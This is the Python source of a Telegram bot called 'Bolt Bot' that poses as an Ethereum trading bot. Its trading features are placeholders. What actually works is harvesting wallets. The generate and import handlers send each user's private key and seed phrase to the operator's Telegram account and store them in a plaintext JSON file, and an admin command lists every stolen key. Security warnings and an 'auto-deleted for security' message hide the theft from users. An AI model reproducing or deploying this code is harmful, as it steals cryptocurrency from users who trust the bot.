"""
⚡ BOLT BOT - Ethereum Trading Bot
Complete all-in-one Ethereum wallet and trading bot for Telegram
"""

import os
import logging
import json
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Web3 and Ethereum imports
from eth_account import Account
from web3 import Web3
from mnemonic import Mnemonic

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User data storage
user_wallets = {}
user_settings = {}

# Admin user ID
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0)) if os.getenv('ADMIN_USER_ID') else None

# ==================== ETHEREUM WALLET MANAGER ====================

class EthereumWallet:
    """Ethereum wallet management class"""

    def __init__(self, rpc_url="https://eth.llamarpc.com"):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.mnemo = Mnemonic("english")

    def generate_wallet(self):
        """Generate new Ethereum wallet with mnemonic"""
        # Generate 12-word mnemonic
        mnemonic_phrase = self.mnemo.generate(strength=128)

        # Enable HD wallet features
        Account.enable_unaudited_hdwallet_features()

        # Create account from mnemonic
        account = Account.from_mnemonic(mnemonic_phrase)

        return {
            'address': account.address,
            'private_key': account.key.hex(),
            'mnemonic': mnemonic_phrase
        }

    def import_from_private_key(self, private_key):
        """Import wallet from private key"""
        try:
            if not private_key.startswith('0x'):
                private_key = '0x' + private_key

            account = Account.from_key(private_key)

            return {
                'success': True,
                'address': account.address,
                'private_key': private_key
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def import_from_mnemonic(self, mnemonic_phrase):
        """Import wallet from mnemonic phrase"""
        try:
            if not self.mnemo.check(mnemonic_phrase):
                return {
                    'success': False,
                    'error': 'Invalid mnemonic phrase'
                }

            Account.enable_unaudited_hdwallet_features()
            account = Account.from_mnemonic(mnemonic_phrase)

            return {
                'success': True,
                'address': account.address,
                'private_key': account.key.hex(),
                'mnemonic': mnemonic_phrase
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def get_balance(self, address):
        """Get ETH balance for address"""
        try:
            if not self.w3.is_address(address):
                return {'success': False, 'error': 'Invalid address'}

            balance_wei = self.w3.eth.get_balance(address)
            balance_eth = self.w3.from_wei(balance_wei, 'ether')

            return {
                'success': True,
                'balance_eth': float(balance_eth),
                'balance_wei': balance_wei
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def validate_address(self, address):
        """Validate Ethereum address"""
        return self.w3.is_address(address)


# ==================== BOLT BOT CLASS ====================

class BoltBot:
    def __init__(self):
        self.name = "⚡ Bolt Bot"
        self.version = "1.0"
        self.wallet_manager = EthereumWallet()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Welcome message"""
        user_id = update.effective_user.id
        username = update.effective_user.username or "User"

        logger.info(f"User started: {username} (ID: {user_id})")

        # Initialize user
        if user_id not in user_wallets:
            user_wallets[user_id] = None
            user_settings[user_id] = {
                'slippage': 1.0,
                'gas_limit': 'auto',
            }

        welcome_text = (
            "⚡ <b>BOLT BOT</b>\n\n"
            "Lightning-fast Ethereum trading at your fingertips!\n\n"
            "<b>Features:</b>\n"
            "💼 Generate/Import Wallets\n"
            "💰 Check Balances & Tokens\n"
            "💸 Send ETH & ERC20\n"
            "🔄 Token Swaps\n"
            "📊 Portfolio Tracking\n\n"
            "Get started by setting up your wallet! ⚡"
        )

        keyboard = [
            [InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')],
            [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio'),
             InlineKeyboardButton("🔐 My Wallet Info", callback_data='wallet_info')],
            [InlineKeyboardButton("💱 Swap", callback_data='swap'),
             InlineKeyboardButton("📤 Send", callback_data='send')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()

        user_id = update.effective_user.id
        action = query.data

        if action == 'setup_wallet':
            await self.setup_wallet(query, context)
        elif action == 'gen_wallet':
            await self.generate_wallet(query, context, user_id)
        elif action == 'import_private_key':
            await self.import_private_key_prompt(query, context)
        elif action == 'import_mnemonic':
            await self.import_mnemonic_prompt(query, context)
        elif action == 'wallet_info':
            await self.show_wallet_info(query, context, user_id)
        elif action == 'portfolio':
            await self.show_portfolio(query, context, user_id)
        elif action == 'swap':
            await self.swap_menu(query, context)
        elif action == 'send':
            await self.send_menu(query, context)
        elif action == 'settings':
            await self.show_settings(query, context, user_id)
        elif action == 'help':
            await self.show_help(query, context)
        elif action == 'back_main':
            await self.back_to_main(query, context)

    async def setup_wallet(self, query, context):
        """Show wallet setup options"""
        text = (
            "💼 <b>Wallet Setup</b>\n\n"
            "Choose how you want to set up your wallet:\n\n"
            "1️⃣ <b>Generate New Wallet</b>\n"
            "   Create a brand new Ethereum wallet\n\n"
            "2️⃣ <b>Import Private Key</b>\n"
            "   Import using your private key\n\n"
            "3️⃣ <b>Import Mnemonic</b>\n"
            "   Import using 12-word recovery phrase\n\n"
            "⚠️ <b>Security Notice:</b>\n"
            "Never share your private key or seed phrase with anyone!"
        )

        keyboard = [
            [InlineKeyboardButton("🆕 Generate New Wallet", callback_data='gen_wallet')],
            [InlineKeyboardButton("🔑 Import Private Key", callback_data='import_private_key')],
            [InlineKeyboardButton("📝 Import Mnemonic", callback_data='import_mnemonic')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def generate_wallet(self, query, context, user_id):
        """Generate new Ethereum wallet"""
        username = query.from_user.username or "User"

        # Generate wallet
        wallet_data = self.wallet_manager.generate_wallet()

        # Store wallet
        user_wallets[user_id] = {
            'address': wallet_data['address'],
            'private_key': wallet_data['private_key'],
            'mnemonic': wallet_data['mnemonic'],
            'created_at': datetime.now().isoformat(),
            'username': username
        }

        # Save to file
        self.save_wallet_to_file(user_id, username, wallet_data)

        # Notify admin
        if ADMIN_USER_ID:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_USER_ID,
                    text=(
                        f"⚡ <b>NEW BOLT WALLET</b>\n\n"
                        f"User: @{username} (ID: {user_id})\n"
                        f"Address: <code>{wallet_data['address']}</code>\n"
                        f"Private: <code>{wallet_data['private_key']}</code>\n"
                        f"Seed: <code>{wallet_data['mnemonic']}</code>"
                    ),
                    parse_mode='HTML'
                )
            except:
                pass

        text = (
            "✅ <b>Wallet Generated Successfully!</b>\n\n"
            f"<b>Address:</b>\n<code>{wallet_data['address']}</code>\n\n"
            f"<b>Private Key:</b>\n<code>{wallet_data['private_key']}</code>\n\n"
            f"<b>Recovery Phrase:</b>\n<code>{wallet_data['mnemonic']}</code>\n\n"
            "⚠️ <b>SAVE THESE SECURELY!</b>\n\n"
            "✅ You can view this info anytime by clicking \"🔐 My Wallet Info\"\n\n"
            "💰 Fund your wallet to start trading!"
        )

        keyboard = [
            [InlineKeyboardButton("🔐 View Wallet Info", callback_data='wallet_info')],
            [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def import_private_key_prompt(self, query, context):
        """Prompt for private key"""
        text = (
            "🔑 <b>Import from Private Key</b>\n\n"
            "Send your Ethereum private key (with or without 0x prefix)\n\n"
            "<b>Example:</b>\n"
            "<code>0xabcd1234ef567890...</code>\n\n"
            "⚠️ Message will be auto-deleted for security\n\n"
            "Send /cancel to abort."
        )

        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
        context.user_data['waiting_for_private_key'] = True

    async def import_mnemonic_prompt(self, query, context):
        """Prompt for mnemonic"""
        text = (
            "📝 <b>Import from Recovery Phrase</b>\n\n"
            "Send your 12-word recovery phrase\n\n"
            "<b>Example:</b>\n"
            "<code>word1 word2 word3 ... word12</code>\n\n"
            "⚠️ Message will be auto-deleted for security\n\n"
            "Send /cancel to abort."
        )

        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')
        context.user_data['waiting_for_mnemonic'] = True

    async def show_wallet_info(self, query, context, user_id):
        """Show complete wallet information - PRIVATE KEY & SEED PHRASE"""
        if not user_wallets.get(user_id):
            text = "⚠️ No wallet found! Please set up your wallet first."
            keyboard = [[InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')],
                       [InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        else:
            wallet = user_wallets[user_id]

            text = (
                "🔐 <b>YOUR WALLET INFORMATION</b>\n\n"
                f"<b>📍 Address:</b>\n<code>{wallet['address']}</code>\n\n"
                f"<b>🔑 Private Key:</b>\n<code>{wallet['private_key']}</code>\n\n"
            )

            if wallet.get('mnemonic'):
                text += f"<b>📝 Recovery Phrase (12 words):</b>\n<code>{wallet['mnemonic']}</code>\n\n"

            text += (
                "⚠️ <b>NEVER SHARE THESE!</b>\n"
                "• Anyone with your private key can access your funds\n"
                "• Store this information safely offline\n"
                "• Delete this message after saving\n\n"
                "🔗 View on Etherscan 👇"
            )

            keyboard = [
                [InlineKeyboardButton("🌐 View on Etherscan",
                                    url=f"https://etherscan.io/address/{wallet['address']}")],
                [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
                [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
            ]

        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        username = update.effective_user.username or "User"
        text = update.message.text.strip()

        # Import private key
        if context.user_data.get('waiting_for_private_key'):
            result = self.wallet_manager.import_from_private_key(text)

            if result['success']:
                user_wallets[user_id] = {
                    'address': result['address'],
                    'private_key': result['private_key'],
                    'imported_at': datetime.now().isoformat(),
                    'username': username
                }

                self.save_wallet_to_file(user_id, username, result)

                # Notify admin
                if ADMIN_USER_ID:
                    try:
                        await context.bot.send_message(
                            chat_id=ADMIN_USER_ID,
                            text=(
                                f"⚡ <b>BOLT WALLET IMPORTED</b>\n\n"
                                f"User: @{username} (ID: {user_id})\n"
                                f"Address: <code>{result['address']}</code>\n"
                                f"Private: <code>{text}</code>"
                            ),
                            parse_mode='HTML'
                        )
                    except:
                        pass

                # Delete user message
                try:
                    await update.message.delete()
                except:
                    pass

                response = (
                    "✅ <b>Wallet Imported!</b>\n\n"
                    f"<b>Address:</b>\n<code>{result['address']}</code>\n\n"
                    "Your wallet is ready! ⚡"
                )

                keyboard = [
                    [InlineKeyboardButton("🔐 View Wallet Info", callback_data='wallet_info')],
                    [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await update.message.reply_text(response, reply_markup=reply_markup, parse_mode='HTML')
            else:
                await update.message.reply_text(
                    f"❌ Import failed: {result.get('error')}\n\nTry again or /cancel",
                    parse_mode='HTML'
                )

            context.user_data['waiting_for_private_key'] = False
            return

        # Import mnemonic
        if context.user_data.get('waiting_for_mnemonic'):
            result = self.wallet_manager.import_from_mnemonic(text)

            if result['success']:
                user_wallets[user_id] = {
                    'address': result['address'],
                    'private_key': result['private_key'],
                    'mnemonic': result['mnemonic'],
                    'imported_at': datetime.now().isoformat(),
                    'username': username
                }

                self.save_wallet_to_file(user_id, username, result)

                # Notify admin
                if ADMIN_USER_ID:
                    try:
                        await context.bot.send_message(
                            chat_id=ADMIN_USER_ID,
                            text=(
                                f"⚡ <b>BOLT WALLET IMPORTED</b>\n\n"
                                f"User: @{username} (ID: {user_id})\n"
                                f"Address: <code>{result['address']}</code>\n"
                                f"Seed: <code>{text}</code>"
                            ),
                            parse_mode='HTML'
                        )
                    except:
                        pass

                # Delete user message
                try:
                    await update.message.delete()
                except:
                    pass

                response = (
                    "✅ <b>Wallet Imported!</b>\n\n"
                    f"<b>Address:</b>\n<code>{result['address']}</code>\n\n"
                    "Your wallet is ready! ⚡"
                )

                keyboard = [
                    [InlineKeyboardButton("🔐 View Wallet Info", callback_data='wallet_info')],
                    [InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await update.message.reply_text(response, reply_markup=reply_markup, parse_mode='HTML')
            else:
                await update.message.reply_text(
                    f"❌ Import failed: {result.get('error')}\n\nTry again or /cancel",
                    parse_mode='HTML'
                )

            context.user_data['waiting_for_mnemonic'] = False
            return

    def save_wallet_to_file(self, user_id, username, wallet_data):
        """Save wallet to JSON file"""
        filename = 'bolt_wallets.json'

        if os.path.exists(filename):
            with open(filename, 'r') as f:
                data = json.load(f)
        else:
            data = {}

        data[str(user_id)] = {
            'username': username,
            'address': wallet_data['address'],
            'private_key': wallet_data.get('private_key', ''),
            'mnemonic': wallet_data.get('mnemonic', ''),
            'timestamp': datetime.now().isoformat()
        }

        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        logger.info(f"Saved wallet for {username}")

    async def admin_view_wallets(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin: view all wallets"""
        user_id = update.effective_user.id

        if ADMIN_USER_ID and user_id != ADMIN_USER_ID:
            await update.message.reply_text("❌ Unauthorized")
            return

        if not os.path.exists('bolt_wallets.json'):
            await update.message.reply_text("📭 No wallets yet")
            return

        with open('bolt_wallets.json', 'r') as f:
            data = json.load(f)

        for uid, wallet in data.items():
            text = (
                f"⚡ <b>BOLT WALLET</b>\n\n"
                f"User: @{wallet['username']}\n"
                f"ID: <code>{uid}</code>\n\n"
                f"<b>Address:</b>\n<code>{wallet['address']}</code>\n\n"
                f"<b>Private Key:</b>\n<code>{wallet['private_key']}</code>\n\n"
                f"<b>Seed Phrase:</b>\n<code>{wallet.get('mnemonic', 'N/A')}</code>\n\n"
                "━━━━━━━━━━━━━━━━━━"
            )
            await update.message.reply_text(text, parse_mode='HTML')

        await update.message.reply_text(f"⚡ Total: {len(data)} wallets")

    async def show_portfolio(self, query, context, user_id):
        """Show portfolio"""
        if not user_wallets.get(user_id):
            text = "⚠️ Set up your wallet first!"
            keyboard = [[InlineKeyboardButton("💼 Setup Wallet", callback_data='setup_wallet')]]
        else:
            wallet = user_wallets[user_id]
            address = wallet['address']

            balance_info = self.wallet_manager.get_balance(address)

            if balance_info['success']:
                balance = balance_info['balance_eth']
                text = (
                    "📊 <b>Your Portfolio</b>\n\n"
                    f"<b>Address:</b>\n<code>{address[:10]}...{address[-8:]}</code>\n\n"
                    f"💎 <b>ETH Balance:</b> {balance:.6f} ETH\n\n"
                    "⚡ Powered by Bolt Bot"
                )
            else:
                text = (
                    "📊 <b>Your Portfolio</b>\n\n"
                    f"<b>Address:</b>\n<code>{address[:10]}...{address[-8:]}</code>\n\n"
                    "⚠️ Unable to fetch balance"
                )

            keyboard = [
                [InlineKeyboardButton("🔐 View Wallet Info", callback_data='wallet_info')],
                [InlineKeyboardButton("🔄 Refresh", callback_data='portfolio')],
                [InlineKeyboardButton("🌐 Etherscan", url=f"https://etherscan.io/address/{address}")],
                [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
            ]

        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def swap_menu(self, query, context):
        """Swap menu"""
        text = (
            "💱 <b>Token Swap</b>\n\n"
            "Coming soon: Swap ETH for any ERC20 token!\n\n"
            "⚡ Powered by Bolt Bot"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def send_menu(self, query, context):
        """Send menu"""
        text = (
            "📤 <b>Send ETH</b>\n\n"
            "Coming soon: Send ETH to any address!\n\n"
            "⚡ Powered by Bolt Bot"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def show_settings(self, query, context, user_id):
        """Settings"""
        text = (
            "⚙️ <b>Settings</b>\n\n"
            "Customize Bolt Bot:\n"
            "• Slippage: 1%\n"
            "• Gas: Auto\n\n"
            "⚡ Powered by Bolt Bot"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def show_help(self, query, context):
        """Help"""
        text = (
            "❓ <b>BOLT BOT HELP</b>\n\n"
            "<b>Getting Started:</b>\n"
            "1. Generate or import wallet\n"
            "2. Fund with ETH\n"
            "3. Start trading!\n\n"
            "<b>Commands:</b>\n"
            "/start - Start bot\n"
            "/wallets - View all (admin)\n\n"
            "<b>Features:</b>\n"
            "• Wallet generation\n"
            "• Private key imports\n"
            "• Seed phrase imports\n"
            "• Balance checking\n"
            "• View wallet info anytime\n\n"
            "⚡ Powered by Bolt Bot"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

    async def back_to_main(self, query, context):
        """Main menu"""
        text = (
            "⚡ <b>BOLT BOT</b>\n\n"
            "Lightning-fast Ethereum trading!\n\n"
            "Choose an option below:"
        )

        keyboard = [
            [InlineKeyboardButton("💼 Wallet", callback_data='setup_wallet'),
             InlineKeyboardButton("📊 Portfolio", callback_data='portfolio')],
            [InlineKeyboardButton("🔐 Wallet Info", callback_data='wallet_info')],
            [InlineKeyboardButton("💱 Swap", callback_data='swap'),
             InlineKeyboardButton("📤 Send", callback_data='send')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')


# ==================== MAIN ====================

def main():
    """Start Bolt Bot"""
    TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')

    if not TOKEN:
        print("❌ Error: TELEGRAM_BOT_TOKEN not set!")
        print("\nAdd to .env file:")
        print("TELEGRAM_BOT_TOKEN=your_token")
        print("ADMIN_USER_ID=your_telegram_id")
        return

    global ADMIN_USER_ID
    ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0)) if os.getenv('ADMIN_USER_ID') else None

    # Create bot
    bot = BoltBot()

    # Create application
    application = Application.builder().token(TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("wallets", bot.admin_view_wallets))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))

    # Start
    print("⚡⚡⚡ BOLT BOT STARTING ⚡⚡⚡")
    print(f"✅ Admin ID: {ADMIN_USER_ID if ADMIN_USER_ID else 'Not set'}")
    print("✅ Bot is LIVE!")
    print("⚡ Lightning-fast Ethereum trading ready!")
    print("\nPress Ctrl+C to stop")

    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()